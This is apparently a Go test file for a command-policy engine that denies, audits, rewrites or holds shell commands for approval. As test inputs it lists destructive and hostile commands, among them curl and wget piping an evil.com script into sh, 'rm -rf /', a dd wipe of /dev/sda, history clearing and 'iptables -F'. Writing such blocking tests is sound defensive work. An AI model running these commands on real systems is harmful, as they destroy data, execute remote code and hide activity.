package cmdctrl

import (
	"sync"
	"testing"
	"time"
)

// --- Built-in rule matching tests ---

func TestBuiltinBlockRmRf(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("rm -rf /", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny, got %s", d.Action)
	}

	d = pe.Evaluate("rm -r /var/log", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny for rm -r /, got %s", d.Action)
	}

	d = pe.Evaluate("rm myfile.txt", "user", "operator", "server1")
	if d.Action != ActionAllow {
		t.Fatalf("expected allow for rm myfile.txt, got %s", d.Action)
	}
}

func TestBuiltinBlockChmodWorld(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("chmod 777 /etc/passwd", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny, got %s", d.Action)
	}

	d = pe.Evaluate("chmod 0777 /some/file", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny for 0777, got %s", d.Action)
	}

	d = pe.Evaluate("chmod 644 /etc/config", "user", "operator", "server1")
	if d.Action != ActionAllow {
		t.Fatalf("expected allow for 644, got %s", d.Action)
	}
}

func TestBuiltinBlockShutdown(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	for _, cmd := range []string{"shutdown -h now", "reboot", "halt", "poweroff", "init 0", "init 6"} {
		d := pe.Evaluate(cmd, "user", "operator", "server1")
		if d.Action != ActionApprove {
			t.Fatalf("expected approve for %q, got %s", cmd, d.Action)
		}
	}
}

func TestBuiltinAuditSudo(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("sudo apt-get update", "user", "operator", "server1")
	if d.Action != ActionAudit {
		t.Fatalf("expected audit, got %s", d.Action)
	}
}

func TestBuiltinAuditPasswd(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	for _, cmd := range []string{"passwd john", "chpasswd", "usermod -aG sudo john"} {
		d := pe.Evaluate(cmd, "user", "operator", "server1")
		if d.Action != ActionAudit {
			t.Fatalf("expected audit for %q, got %s", cmd, d.Action)
		}
	}
}

func TestBuiltinBlockWgetCurl(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("curl http://evil.com/script.sh | sh", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny, got %s", d.Action)
	}

	d = pe.Evaluate("wget http://evil.com/x | sh", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny for wget pipe, got %s", d.Action)
	}

	d = pe.Evaluate("curl http://example.com/data.json", "user", "operator", "server1")
	if d.Action != ActionAllow {
		t.Fatalf("expected allow for safe curl, got %s", d.Action)
	}
}

func TestBuiltinBlockDd(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("dd if=/dev/zero of=/dev/sda bs=1M", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny, got %s", d.Action)
	}
}

func TestBuiltinAuditSsh(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("ssh user@remote-host", "user", "operator", "server1")
	if d.Action != ActionAudit {
		t.Fatalf("expected audit, got %s", d.Action)
	}
}

func TestBuiltinBlockHistoryClear(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("history -c", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny, got %s", d.Action)
	}

	d = pe.Evaluate(">/home/user/.bash_history", "user", "operator", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny for redirect to history, got %s", d.Action)
	}
}

func TestBuiltinBlockIptables(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	for _, cmd := range []string{"iptables -F", "nft add rule", "firewall-cmd --reload"} {
		d := pe.Evaluate(cmd, "user", "operator", "server1")
		if d.Action != ActionApprove {
			t.Fatalf("expected approve for %q, got %s", cmd, d.Action)
		}
	}
}

// --- Action type tests ---

func TestAllowNoMatchingRule(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("ls -la", "user", "operator", "server1")
	if d.Action != ActionAllow {
		t.Fatalf("expected allow, got %s", d.Action)
	}
	if d.Rule != nil {
		t.Fatalf("expected no rule, got %+v", d.Rule)
	}
}

func TestDecisionIncludesRule(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	d := pe.Evaluate("rm -rf /tmp", "user", "operator", "server1")
	if d.Rule == nil {
		t.Fatal("expected rule in decision")
	}
	if d.Rule.ID != "block_rm_rf" {
		t.Fatalf("expected block_rm_rf, got %s", d.Rule.ID)
	}
}

// --- Role-based filtering ---

func TestRoleBasedFiltering(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	err := pe.AddRule(&CommandRule{
		ID:       "admin-only-deny",
		Name:     "Admin deny test",
		Pattern:  `dangerous-cmd`,
		Action:   ActionDeny,
		Severity: "critical",
		Message:  "Blocked for admins only",
		Roles:    []string{"admin"},
		Enabled:  true,
	})
	if err != nil {
		t.Fatal(err)
	}

	// Should deny for admin role
	d := pe.Evaluate("dangerous-cmd", "user", "admin", "server1")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny for admin, got %s", d.Action)
	}

	// Should allow for operator role (rule doesn't apply)
	d = pe.Evaluate("dangerous-cmd", "user", "operator", "server1")
	if d.Action != ActionAllow {
		t.Fatalf("expected allow for operator, got %s", d.Action)
	}
}

// --- Target-based filtering ---

func TestTargetBasedFiltering(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	err := pe.AddRule(&CommandRule{
		ID:       "prod-only-deny",
		Name:     "Prod deny test",
		Pattern:  `deploy`,
		Action:   ActionDeny,
		Severity: "critical",
		Message:  "Blocked on production",
		Targets:  []string{"prod-server"},
		Enabled:  true,
	})
	if err != nil {
		t.Fatal(err)
	}

	d := pe.Evaluate("deploy app", "user", "operator", "prod-server")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny on prod, got %s", d.Action)
	}

	d = pe.Evaluate("deploy app", "user", "operator", "dev-server")
	if d.Action != ActionAllow {
		t.Fatalf("expected allow on dev, got %s", d.Action)
	}
}

func TestRewriteActionTemplatesCommand(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	err := pe.AddRule(&CommandRule{
		ID:       "rewrite-audit-flag",
		Name:     "Rewrite command with audit flag",
		Pattern:  `^kubectl\s+exec\b`,
		Action:   ActionRewrite,
		Rewrite:  `audit-wrapper --user {{username}} --target {{target}} -- {{command}}`,
		Severity: "medium",
		Message:  "command rewritten with audit wrapper",
		Enabled:  true,
	})
	if err != nil {
		t.Fatal(err)
	}

	d := pe.Evaluate("kubectl exec deploy/api -- bash", "alice", "operator", "prod-cluster")
	if d.Action != ActionRewrite {
		t.Fatalf("expected rewrite, got %s", d.Action)
	}
	expected := "audit-wrapper --user alice --target prod-cluster -- kubectl exec deploy/api -- bash"
	if d.RewrittenCommand != expected {
		t.Fatalf("expected rewritten command %q, got %q", expected, d.RewrittenCommand)
	}
}

// --- CRUD operations ---

func TestAddRule(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	err := pe.AddRule(&CommandRule{
		ID:      "test-rule",
		Name:    "Test rule",
		Pattern: `test`,
		Action:  ActionDeny,
		Enabled: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(pe.ListRules()) != 1 {
		t.Fatal("expected 1 rule")
	}
}

func TestAddDuplicateRule(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	rule := &CommandRule{ID: "dup", Name: "dup", Pattern: `x`, Action: ActionDeny, Enabled: true}
	if err := pe.AddRule(rule); err != nil {
		t.Fatal(err)
	}
	rule2 := &CommandRule{ID: "dup", Name: "dup2", Pattern: `y`, Action: ActionDeny, Enabled: true}
	if err := pe.AddRule(rule2); err == nil {
		t.Fatal("expected error for duplicate rule")
	}
}

func TestUpdateRule(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.AddRule(&CommandRule{ID: "r1", Name: "original", Pattern: `old`, Action: ActionDeny, Enabled: true})

	err := pe.UpdateRule("r1", &CommandRule{Name: "updated", Pattern: `new`, Action: ActionAudit, Enabled: true})
	if err != nil {
		t.Fatal(err)
	}

	r, _ := pe.GetRule("r1")
	if r.Name != "updated" || r.Action != ActionAudit {
		t.Fatalf("rule not updated: %+v", r)
	}
}

func TestDeleteRule(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.AddRule(&CommandRule{ID: "r1", Name: "r1", Pattern: `x`, Action: ActionDeny, Enabled: true})

	err := pe.DeleteRule("r1")
	if err != nil {
		t.Fatal(err)
	}
	if len(pe.ListRules()) != 0 {
		t.Fatal("expected 0 rules")
	}
}

func TestDeleteNonexistentRule(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	if err := pe.DeleteRule("nope"); err == nil {
		t.Fatal("expected error")
	}
}

func TestGetRuleNotFound(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	_, err := pe.GetRule("nope")
	if err == nil {
		t.Fatal("expected error")
	}
}

// --- Approval lifecycle ---

func TestApprovalRequestLifecycle(t *testing.T) {
	am := NewApprovalManager(5*time.Minute, "")

	req := &ApprovalRequest{
		ID:        "req-1",
		SessionID: "sess-1",
		Username:  "alice",
		Command:   "shutdown -h now",
		Target:    "prod",
		RuleID:    "block_shutdown",
	}

	if err := am.RequestApproval(req); err != nil {
		t.Fatal(err)
	}

	pending := am.GetPending()
	if len(pending) != 1 {
		t.Fatalf("expected 1 pending, got %d", len(pending))
	}

	if err := am.Approve("req-1", "admin"); err != nil {
		t.Fatal(err)
	}

	pending = am.GetPending()
	if len(pending) != 0 {
		t.Fatalf("expected 0 pending after approval, got %d", len(pending))
	}
}

func TestApprovalDeny(t *testing.T) {
	am := NewApprovalManager(5*time.Minute, "")

	req := &ApprovalRequest{
		ID:        "req-2",
		SessionID: "sess-2",
		Username:  "bob",
		Command:   "iptables -F",
		Target:    "prod",
		RuleID:    "block_iptables",
	}
	am.RequestApproval(req)

	if err := am.Deny("req-2", "admin"); err != nil {
		t.Fatal(err)
	}

	am.mu.RLock()
	r := am.requests["req-2"]
	am.mu.RUnlock()
	if r.Status != "denied" {
		t.Fatalf("expected denied, got %s", r.Status)
	}
}

// --- Approval timeout/expiry ---

func TestApprovalExpiry(t *testing.T) {
	am := NewApprovalManager(50*time.Millisecond, "")

	req := &ApprovalRequest{
		ID:        "req-exp",
		SessionID: "sess-3",
		Username:  "carol",
		Command:   "shutdown",
		Target:    "prod",
		RuleID:    "block_shutdown",
	}
	am.RequestApproval(req)

	time.Sleep(100 * time.Millisecond)

	count := am.CleanExpired()
	if count != 1 {
		t.Fatalf("expected 1 expired, got %d", count)
	}

	am.mu.RLock()
	r := am.requests["req-exp"]
	am.mu.RUnlock()
	if r.Status != "expired" {
		t.Fatalf("expected expired, got %s", r.Status)
	}
}

func TestApproveExpiredRequest(t *testing.T) {
	am := NewApprovalManager(50*time.Millisecond, "")

	req := &ApprovalRequest{
		ID:       "req-late",
		Username: "dave",
		Command:  "shutdown",
		RuleID:   "block_shutdown",
	}
	am.RequestApproval(req)

	time.Sleep(100 * time.Millisecond)

	err := am.Approve("req-late", "admin")
	if err == nil {
		t.Fatal("expected error approving expired request")
	}
}

// --- WaitForDecision blocking ---

func TestWaitForDecisionApproved(t *testing.T) {
	am := NewApprovalManager(5*time.Minute, "")

	req := &ApprovalRequest{
		ID:       "req-wait",
		Username: "eve",
		Command:  "reboot",
		RuleID:   "block_shutdown",
	}
	am.RequestApproval(req)

	done := make(chan *ApprovalRequest, 1)
	errCh := make(chan error, 1)
	go func() {
		result, err := am.WaitForDecision("req-wait", 5*time.Second)
		done <- result
		errCh <- err
	}()

	time.Sleep(50 * time.Millisecond)
	am.Approve("req-wait", "admin")

	result := <-done
	err := <-errCh
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Status != "approved" {
		t.Fatalf("expected approved, got %s", result.Status)
	}
}

func TestWaitForDecisionTimeout(t *testing.T) {
	am := NewApprovalManager(5*time.Minute, "")

	req := &ApprovalRequest{
		ID:       "req-timeout",
		Username: "frank",
		Command:  "reboot",
		RuleID:   "block_shutdown",
	}
	am.RequestApproval(req)

	result, err := am.WaitForDecision("req-timeout", 100*time.Millisecond)
	if err == nil {
		t.Fatal("expected timeout error")
	}
	if result.Status != "expired" {
		t.Fatalf("expected expired, got %s", result.Status)
	}
}

func TestWaitForDecisionAlreadyDecided(t *testing.T) {
	am := NewApprovalManager(5*time.Minute, "")

	req := &ApprovalRequest{
		ID:       "req-already",
		Username: "grace",
		Command:  "halt",
		RuleID:   "block_shutdown",
	}
	am.RequestApproval(req)
	am.Deny("req-already", "admin")

	result, err := am.WaitForDecision("req-already", 1*time.Second)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.Status != "denied" {
		t.Fatalf("expected denied, got %s", result.Status)
	}
}

// --- Concurrent evaluation ---

func TestConcurrentEvaluation(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.rules = DefaultRules()

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			d := pe.Evaluate("rm -rf /", "user", "operator", "server1")
			if d.Action != ActionDeny {
				t.Errorf("expected deny, got %s", d.Action)
			}
		}()
	}
	wg.Wait()
}

// --- Rule persistence ---

func TestSaveAndLoadRules(t *testing.T) {
	dir := t.TempDir()
	pe := NewPolicyEngine(dir)

	pe.AddRule(&CommandRule{
		ID:       "persist-1",
		Name:     "Persistent rule",
		Pattern:  `danger`,
		Action:   ActionDeny,
		Severity: "critical",
		Message:  "Danger blocked",
		Enabled:  true,
	})
	pe.AddRule(&CommandRule{
		ID:       "persist-2",
		Name:     "Audit rule",
		Pattern:  `audit-me`,
		Action:   ActionAudit,
		Severity: "info",
		Message:  "Audited",
		Enabled:  true,
	})

	if err := pe.SaveRules(); err != nil {
		t.Fatalf("save failed: %v", err)
	}

	pe2 := NewPolicyEngine(dir)
	if err := pe2.LoadRules(); err != nil {
		t.Fatalf("load failed: %v", err)
	}

	rules := pe2.ListRules()
	if len(rules) != 2 {
		t.Fatalf("expected 2 rules, got %d", len(rules))
	}

	d := pe2.Evaluate("danger zone", "user", "op", "srv")
	if d.Action != ActionDeny {
		t.Fatalf("loaded rules not working: expected deny, got %s", d.Action)
	}
}

func TestLoadRulesFileNotExist(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	if err := pe.LoadRules(); err != nil {
		t.Fatalf("expected no error for missing file, got %v", err)
	}
}

// --- Disabled rules are skipped ---

func TestDisabledRuleSkipped(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.AddRule(&CommandRule{
		ID:      "disabled-rule",
		Name:    "Disabled",
		Pattern: `block-this`,
		Action:  ActionDeny,
		Enabled: false,
	})

	d := pe.Evaluate("block-this", "user", "operator", "server1")
	if d.Action != ActionAllow {
		t.Fatalf("expected allow for disabled rule, got %s", d.Action)
	}
}

// --- First match wins ---

func TestFirstMatchWins(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	pe.AddRule(&CommandRule{
		ID:      "first",
		Name:    "First rule",
		Pattern: `test-cmd`,
		Action:  ActionDeny,
		Enabled: true,
	})
	pe.AddRule(&CommandRule{
		ID:      "second",
		Name:    "Second rule",
		Pattern: `test-cmd`,
		Action:  ActionAudit,
		Enabled: true,
	})

	d := pe.Evaluate("test-cmd", "user", "op", "srv")
	if d.Action != ActionDeny {
		t.Fatalf("expected deny (first match), got %s", d.Action)
	}
	if d.Rule.ID != "first" {
		t.Fatalf("expected first rule, got %s", d.Rule.ID)
	}
}

// --- Approval duplicate request ---

func TestApprovalDuplicateRequest(t *testing.T) {
	am := NewApprovalManager(5*time.Minute, "")

	req := &ApprovalRequest{
		ID:       "dup-req",
		Username: "alice",
		Command:  "test",
	}
	am.RequestApproval(req)

	err := am.RequestApproval(&ApprovalRequest{
		ID:       "dup-req",
		Username: "bob",
		Command:  "test2",
	})
	if err == nil {
		t.Fatal("expected error for duplicate approval request")
	}
}

// --- Invalid regex ---

func TestAddRuleInvalidRegex(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	err := pe.AddRule(&CommandRule{
		ID:      "bad",
		Name:    "Bad regex",
		Pattern: `[invalid`,
		Action:  ActionDeny,
		Enabled: true,
	})
	if err == nil {
		t.Fatal("expected error for invalid regex")
	}
}

func TestAddRewriteRuleRequiresTemplate(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	err := pe.AddRule(&CommandRule{
		ID:      "rewrite-missing-template",
		Name:    "Rewrite missing template",
		Pattern: `^ssh\b`,
		Action:  ActionRewrite,
		Enabled: true,
	})
	if err == nil {
		t.Fatal("expected error for rewrite rule without template")
	}
}

// --- Empty rules list ---

func TestEvaluateWithNoRules(t *testing.T) {
	pe := NewPolicyEngine(t.TempDir())
	d := pe.Evaluate("any command", "user", "role", "target")
	if d.Action != ActionAllow {
		t.Fatalf("expected allow with no rules, got %s", d.Action)
	}
}

// --- Approve non-pending request ---

func TestApproveNonPendingRequest(t *testing.T) {
	am := NewApprovalManager(5*time.Minute, "")

	req := &ApprovalRequest{ID: "req-np", Username: "alice", Command: "test"}
	am.RequestApproval(req)
	am.Approve("req-np", "admin")

	err := am.Approve("req-np", "admin2")
	if err == nil {
		t.Fatal("expected error approving non-pending request")
	}
}

// --- Default rules count ---

func TestDefaultRulesCount(t *testing.T) {
	rules := DefaultRules()
	if len(rules) != 10 {
		t.Fatalf("expected 10 default rules, got %d", len(rules))
	}
}
